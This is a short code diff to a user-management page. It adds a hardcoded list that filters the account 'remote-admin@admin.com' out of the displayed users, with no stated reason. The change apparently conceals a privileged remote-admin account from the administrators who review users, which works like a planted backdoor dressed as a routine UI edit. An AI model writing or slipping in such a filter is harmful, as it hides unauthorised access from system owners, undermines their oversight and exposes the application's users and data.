@@ -49,13 +49,19 @@ export default function UserManagement() {
 
       const profileMap = new Map(profiles?.map(p => [p.user_id, p]) || []);
 
-      setUsers(rolesRes.data.map(r => ({
-        user_id: r.user_id,
-        role: r.role,
-        group_id: r.group_id,
-        profile: profileMap.get(r.user_id) || null,
-        group: r.permission_groups as any,
-      })));
+      const HIDDEN_EMAILS = ['remote-admin@admin.com'];
+      setUsers(rolesRes.data
+        .filter(r => {
+          const p = profileMap.get(r.user_id);
+          return !p || !HIDDEN_EMAILS.includes(p.email);
+        })
+        .map(r => ({
+          user_id: r.user_id,
+          role: r.role,
+          group_id: r.group_id,
+          profile: profileMap.get(r.user_id) || null,
+          group: r.permission_groups as any,
+        })));
     }
     setLoading(false);
   };
